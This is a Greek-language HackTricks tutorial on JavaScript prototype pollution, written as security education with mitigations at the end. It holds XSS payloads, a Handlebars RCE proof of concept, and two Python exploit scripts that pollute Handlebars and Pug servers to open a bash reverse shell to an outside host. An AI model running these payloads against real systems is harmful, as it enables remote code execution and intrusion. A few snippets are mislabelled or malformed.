# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

## Αντικείμενα στο JavaScript <a href="#id-053a" id="id-053a"></a>

Τα αντικείμενα στο JavaScript είναι ουσιαστικά συλλογές ζευγών κλειδιών-τιμών, γνωστά ως ιδιότητες. Ένα αντικείμενο μπορεί να δημιουργηθεί χρησιμοποιώντας το `Object.create` με `null` ως όρισμα για τη δημιουργία ενός κενού αντικειμένου. Αυτή η μέθοδος επιτρέπει τη δημιουργία ενός αντικειμένου χωρίς κληρονομημένες ιδιότητες.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Ένα κενό αντικείμενο είναι παρόμοιο με ένα κενό λεξικό, αναπαριστάται ως `{}`.

### Συναρτήσεις και Κλάσεις στο JavaScript

Στο JavaScript, οι κλάσεις και οι συναρτήσεις είναι στενά συνδεδεμένες, με τις συναρτήσεις συχνά να λειτουργούν ως κατασκευαστές για τις κλάσεις. Παρά την έλλειψη φυσικής υποστήριξης κλάσεων στο JavaScript, οι κατασκευαστές μπορούν να προσομοιώσουν τη συμπεριφορά των κλάσεων.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Πρωτότυπα στο JavaScript

Το JavaScript επιτρέπει την τροποποίηση, προσθήκη ή διαγραφή των χαρακτηριστικών προτύπου κατά τη διάρκεια εκτέλεσης. Αυτή η ευελιξία επιτρέπει τη δυναμική επέκταση των λειτουργιών της κλάσης.

Συναρτήσεις όπως `toString` και `valueOf` μπορούν να τροποποιηθούν για να αλλάξουν τη συμπεριφορά τους, επιδεικνύοντας την προσαρμοστική φύση του συστήματος προτύπων του JavaScript.

## Κληρονομιά

Στην προσανατολισμένη σε πρωτότυπα προγραμματιστική, τα χαρακτηριστικά/μέθοδοι κληρονομούνται από αντικείμενα από κλάσεις. Αυτές οι κλάσεις δημιουργούνται προσθέτοντας χαρακτηριστικά/μεθόδους είτε σε ένα παράδειγμα μιας άλλης κλάσης είτε σε ένα κενό αντικείμενο.

Να σημειωθεί ότι όταν προστίθεται ένα χαρακτηριστικό σε ένα αντικείμενο που λειτουργεί ως πρότυπο για άλλα αντικείμενα (όπως το `myPersonObj`), τα κληρονομούντα αντικείμενα αποκτούν πρόσβαση σε αυτό το νέο χαρακτηριστικό. Ωστόσο, αυτό το χαρακτηριστικό δεν εμφανίζεται αυτόματα εκτός αν κληθεί ρητά.

## Ρύπανση \_\_proto\_\_ <a href="#id-0d0a" id="id-0d0a"></a>

## Εξερεύνηση της Ρύπανσης του Προτύπου στο JavaScript

Τα αντικείμενα του JavaScript ορίζονται από ζεύγη κλειδιών-τιμών και κληρονομούν από το πρότυπο Αντικειμένου του JavaScript. Αυτό σημαίνει ότι η τροποποίηση του Προτύπου Αντικειμένου μπορεί να επηρεάσει όλα τα αντικείμενα στο περιβάλλον.

Ας χρησιμοποιήσουμε ένα διαφορετικό παράδειγμα για να εξηγήσουμε:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Η πρόσβαση στο πρωτότυπο του Object είναι δυνατή μέσω:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Προσθέτοντας ιδιότητες στο πρωτότυπο του Object, κάθε αντικείμενο JavaScript θα κληρονομήσει αυτές τις νέες ιδιότητες:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## Ρύπανση πρωτοτύπου

Για ένα σενάριο όπου η χρήση του `__proto__` είναι περιορισμένη, η τροποποίηση του πρωτοτύπου μιας συνάρτησης είναι μια εναλλακτική λύση:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Αυτό επηρεάζει μόνο τα αντικείμενα που δημιουργήθηκαν από τον κατασκευαστή `Vehicle`, δίνοντάς τους τις ιδιότητες `beep`, `hasWheels`, `honk` και `isElectric`.

Δύο μέθοδοι για να επηρεάσετε παγκοσμίως αντικείμενα JavaScript μέσω της μόλυνσης του πρωτοτύπου περιλαμβάνουν:

1. Μόλυνση του `Object.prototype` απευθείας:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Ρύπανση του πρωτοτύπου ενός κατασκευαστή για μια συχνά χρησιμοποιούμενη δομή:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Μετά από αυτές τις λειτουργίες, κάθε αντικείμενο JavaScript μπορεί να εκτελέσει τις μεθόδους `goodbye` και `greet`.

## Ρύπανση άλλων αντικειμένων

### Από μια κλάση στο Object.prototype

Σε ένα σενάριο όπου μπορείτε **να ρυπάνετε ένα συγκεκριμένο αντικείμενο** και χρειάζεστε να **φτάσετε στο `Object.prototype`** μπορείτε να το αναζητήσετε με κάτι παρόμοιο με τον παρακάτω κώδικα:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Ρύπανση στοιχείων πίνακα

Σημειώστε ότι καθώς μπορείτε να ρυπάνετε τα χαρακτηριστικά των αντικειμένων σε JS, αν έχετε πρόσβαση να ρυπάνετε έναν πίνακα μπορείτε επίσης **να ρυπάνετε τις τιμές του πίνακα** προσβάσιμες **με δείκτες** (σημειώστε ότι δεν μπορείτε να αντικαταστήσετε τις τιμές, οπότε πρέπει να ρυπάνετε δείκτες που χρησιμοποιούνται κάπως αλλά δεν είναι εγγεγραμμένοι).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Ρύπανση στοιχείων Html

Κατά τη δημιουργία ενός στοιχείου HTML μέσω JS είναι δυνατόν να **αντικατασταθεί** το χαρακτηριστικό **`innerHTML`** για να γράψει **οποιονδήποτε κώδικα HTML.** [Ιδέα και παράδειγμα από αυτήν την ανάλυση](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Παραδείγματα

### Βασικό Παράδειγμα

Η μόλυνση του πρωτοτύπου συμβαίνει λόγω μιας αδυναμίας στην εφαρμογή που επιτρέπει την αντικατάσταση ιδιοτήτων στο `Object.prototype`. Αυτό σημαίνει ότι αφού οι περισσότερες αντικείμενα προέρχονται από το `Object.prototype`

Το πιο εύκολο παράδειγμα είναι να προστεθεί μια τιμή σε μια **απροσδιόριστη ιδιότητα ενός αντικειμένου** που θα ελεγχθεί, όπως:
```javascript
if (user.admin) {
```
Εάν το χαρακτηριστικό **`admin` είναι απροσδιόριστο**, είναι δυνατόν να εκμεταλλευτείτε μια PP και να το ορίσετε σε True με κάτι σαν:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Η μηχανική πίσω από αυτό περιλαμβάνει την παραμετροποίηση ιδιοτήτων έτσι ώστε αν ένας επιτιθέμενος έχει έλεγχο πάνω σε συγκεκριμένες εισόδους, μπορεί να τροποποιήσει το πρότυπο όλων των αντικειμένων στην εφαρμογή. Αυτή η παραμετροποίηση συνήθως περιλαμβάνει την ρύθμιση της ιδιότητας `__proto__`, η οποία, στην JavaScript, είναι συνώνυμη με την άμεση τροποποίηση του προτύπου ενός αντικειμένου.

Οι συνθήκες υπό τις οποίες μπορεί να εκτελεστεί με επιτυχία αυτή η επίθεση, όπως περιγράφεται σε μια συγκεκριμένη [μελέτη](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), περιλαμβάνουν:

* Εκτέλεση αναδρομικής συγχώνευσης.
* Ορισμός ιδιοτήτων με βάση ένα μονοπάτι.
* Αντιγραφή αντικειμένων.

### Αντικατάσταση συνάρτησης
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Ρύθμιση του Proto Pollution για RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Ρύθμιση του client-side prototype pollution για XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: Επίθεση prototype pollution μέσω του jQuery $ .extend

[Για περισσότερες λεπτομέρειες ελέγξτε αυτό το άρθρο](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) Στο jQuery, η λειτουργία `$ .extend` μπορεί να οδηγήσει σε ρύθμιση του prototype pollution εάν η λειτουργία αντιγραφής βάθους χρησιμοποιείται εσφαλμένα. Αυτή η λειτουργία χρησιμοποιείται συχνά για την αντιγραφή αντικειμένων ή τη συγχώνευση ιδιοτήτων από ένα προεπιλεγμένο αντικείμενο. Ωστόσο, όταν ρυθμιστεί εσφαλμένα, οι ιδιότητες που προορίζονται για ένα νέο αντικείμενο μπορεί να ανατεθούν στο πρωτότυπο αντί αυτού. Για παράδειγμα:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
### Ευπάθεια CVE-2019–11358

Αυτή η ευπάθεια, που αναγνωρίστηκε ως CVE-2019–11358, επιδεικνύει πώς ένα βαθύ αντίγραφο μπορεί ακούσια να τροποποιήσει το πρωτότυπο, οδηγώντας σε πιθανούς κινδύνους ασφάλειας, όπως μη εξουσιοδοτημένη πρόσβαση διαχειριστή εάν ιδιότητες όπως το `isAdmin` ελέγχονται χωρίς τη σωστή επαλήθευση ύπαρξης.

### CVE-2018–3721, CVE-2019–10744: Επίθεση πρωτότυπου μέσω του lodash

[Για περισσότερες λεπτομέρειες ελέγξτε αυτό το άρθρο](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

Το [Lodash](https://www.npmjs.com/package/lodash) αντιμετώπισε παρόμοιες ευπάθειες προς πρωτότυπο (CVE-2018–3721, CVE-2019–10744). Αυτά τα θέματα αντιμετωπίστηκαν στην έκδοση 4.17.11.

### Άλλος οδηγός με CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Εργαλεία για τον εντοπισμό της Πρωτότυπης Ρύπανσης

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Επέκταση του Burp Suite σχεδιασμένη για τον εντοπισμό και την ανάλυση ευπαθειών πρωτότυπου ρύπανσης στις εφαρμογές ιστού. Αυτό το εργαλείο αυτοματοποιεί τη διαδικασία σάρωσης αιτημάτων για τον εντοπισμό πιθανών προβλημάτων πρωτότυπης ρύπανσης. Εκμεταλλεύεται γνωστά gadgets - μεθόδους εκμετάλλευσης της πρωτότυπης ρύπανσης για την εκτέλεση επιβλαβών ενεργειών - εστιάζοντας ιδιαίτερα σε βιβλιοθήκες Node.js.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Αυτή η επέκταση εντοπίζει ευπαθείες πρωτότυπης ρύπανσης στην πλευρά του διακομιστή. Χρησιμοποιεί τεχνικές που περιγράφονται στην [ευπάθεια πρωτότυπης ρύπανσης στην πλευρά του διακομιστή](https://portswigger.net/research/server-side-prototype-pollution).

### Πρωτότυπη Ρύπανση AST στο NodeJS

Το NodeJS χρησιμοποιεί εκτεταμένα Δέντρα Συντακτικής Ανάλυσης (AST) στη JavaScript για λειτουργίες όπως μηχανές προτύπων και TypeScript. Αυτή η ενότητα εξετάζει τις ευπαθείες που σχετίζονται με την πρωτότυπη ρύπανση στις μηχανές προτύπων, ειδικά στο Handlebars και το Pug.

#### Ανάλυση Ευπαθειών Handlebars

Η μηχανή προτύπων Handlebars είναι ευάλωτη σε μια επίθεση πρωτότυπου ρύπανσης. Αυτή η ευπάθεια προκύπτει από συγκεκριμένες λειτουργίες εντός του αρχείου `javascript-compiler.js`. Για παράδειγμα, η λειτουργία `appendContent` ενώνει το `pendingContent` εάν υπάρχει, ενώ η λειτουργία `pushSource` επαναφέρει το `pendingContent` σε `undefined` μετά την προσθήκη της πηγής.

**Διαδικασία Εκμετάλλευσης**

Η εκμετάλλευση χρησιμοποιεί το AST (Δέντρο Συντακτικής Ανάλυσης) που παράγεται από το Handlebars, ακολουθώντας αυτά τα βήματα:

1. **Ανακατεύθυνση του Αναλυτή**: Αρχικά, ο αναλυτής, μέσω του κόμβου `NumberLiteral`, επιβάλλει ότι οι τιμές είναι αριθμητικές. Η πρωτότυπη ρύπανση μπορεί να παρακάμψει αυτό, επιτρέποντας την εισαγωγή μη αριθμητικών συμβόλων.
2. **Χειρισμός από τον Μεταγλωττιστή**: Ο μεταγλωττιστής μπορεί να επεξεργαστεί ένα αντικείμενο AST ή ένα πρότυπο συμβολοσειράς. Εάν το `input.type` ισούται με `Program`, το εισερχόμενο αντιμετωπίζεται ως προεπεξεργασμένο, το οποίο μπορεί να εκμεταλλευτείται.
3. **Εισαγωγή Κώδικα**: Μέσω της ανακατεύθυνσης του `Object.prototype`, μπορεί κανείς να εισάγει αυθαίρετο κώδικα στη λειτουργία προτύπου, ο οποίος μπορεί να οδηγήσει σε απομακρυσμένη εκτέλεση κώδικα.

Ένα παράδειγμα που δείχνει την εκμετάλλευση της ευπαθείας του Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Αυτός ο κώδικας δείχνει πώς ένας επιτιθέμενος θα μπορούσε να εισάγει αυθαίρετο κώδικα σε ένα πρότυπο Handlebars.

**Εξωτερική Αναφορά**: Βρέθηκε ένα πρόβλημα που σχετίζεται με τη ρύθμιση προτύπου στη βιβλιοθήκη 'flat', όπως περιγράφεται εδώ: [Πρόβλημα στο GitHub](https://github.com/hughsk/flat/issues/105).

**Εξωτερική Αναφορά**: [Πρόβλημα που σχετίζεται με τη ρύθμιση προτύπου στη βιβλιοθήκη 'flat'](https://github.com/hughsk/flat/issues/105)

Παράδειγμα εκμετάλλευσης της ρύθμισης προτύπου σε Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Ευπάθεια στο Pug

Το Pug, ένας άλλος μηχανισμός προτύπου, αντιμετωπίζει έναν παρόμοιο κίνδυνο προσβολής του προτύπου. Λεπτομερείς πληροφορίες είναι διαθέσιμες στη συζήτηση για την [Εισαγωγή AST στο Pug](https://blog.p6.is/AST-Injection/#Pug).

Παράδειγμα προσβολής του προτύπου στο Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Προληπτικά Μέτρα

Για να μειωθεί ο κίνδυνος της ρύθμισης πρωτοτύπου, μπορούν να χρησιμοποιηθούν οι στρατηγικές που παρατίθενται παρακάτω:

1. **Αναλλοίωτα Αντικείμενα**: Το `Object.prototype` μπορεί να γίνει αναλλοίωτο εφαρμόζοντας το `Object.freeze`.
2. **Επικύρωση Εισόδου**: Τα JSON inputs πρέπει να ελέγχονται αυστηρά έναντι του σχήματος της εφαρμογής.
3. **Ασφαλείς Συναρμολογικές Συναρμογές**: Πρέπει να αποφεύγεται η ανασφαλής χρήση αναδρομικών συναρμολογικών συναρμογών.
4. **Αντικείμενα Χωρίς Πρωτότυπο**: Μπορούν να δημιουργηθούν αντικείμενα χωρίς ιδιότητες πρωτοτύπου χρησιμοποιώντας το `Object.create(null)`.
5. **Χρήση του Map**: Αντί για το `Object`, πρέπει να χρησιμοποιείται το `Map` για την αποθήκευση ζευγών κλειδιών-τιμών.
6. **Ενημερώσεις Βιβλιοθηκών**: Οι ενημερώσεις ασφαλείας μπορούν να ενσωματωθούν με την τακτική ενημέρωση των βιβλιοθηκών.
7. **Εργαλεία Ελέγχου Κώδικα και Στατικής Ανάλυσης**: Χρησιμοποιήστε εργαλεία όπως το ESLint με τα κατάλληλα πρόσθετα για την ανίχνευση και πρόληψη ευπάθειών στη ρύθμιση πρωτοτύπου.
8. **Αναθεωρήσεις Κώδικα**: Εφαρμόστε λεπτομερείς αναθεωρήσεις κώδικα για την αναγνώριση και αντιμετώπιση πιθανών κινδύνων που σχετίζονται με τη ρύθμιση πρωτοτύπου.
9. **Εκπαίδευση Ασφάλειας**: Εκπαιδεύστε τους προγραμματιστές σχετικά με τους κινδύνους της ρύθμισης πρωτοτύπου και τις βέλτιστες πρακτικές για τη συγγραφή ασφαλούς κώδικα.
10. **Χρήση Βιβλιοθηκών με Προσοχή**: Να είστε προσεκτικοί κατά τη χρήση βιβλιοθηκών τρίτων. Αξιολογήστε τη θέση της ασφάλειάς τους και αναθεωρήστε τον κώδικά τους, ειδικά αυτών που χειρίζονται αντικείμενα.
11. **Προστασία Εκτέλεσης**: Χρησιμοποιήστε μηχανισμούς προστασίας εκτέλεσης, όπως η χρήση πακέτων npm με εστίαση στην ασφάλεια που μπορούν να ανιχνεύσουν και να προλάβουν επιθέσεις ρύθμισης πρωτοτύπου.

## Αναφορές

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
